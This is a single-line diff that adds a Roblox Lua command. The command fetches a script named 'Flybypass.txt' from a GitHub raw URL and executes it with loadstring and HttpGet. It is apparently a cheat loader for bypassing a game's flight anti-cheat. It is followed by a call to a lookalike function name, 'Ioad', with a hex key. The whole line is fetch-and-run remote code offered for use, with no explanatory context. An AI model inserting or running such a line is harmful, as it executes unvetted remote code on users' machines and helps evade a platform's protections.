@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shade-vex/Script/refs/heads/main/Flybypass.txt"))()Ioad("9186e2ba1e71992722a5060dc6ec9f27")
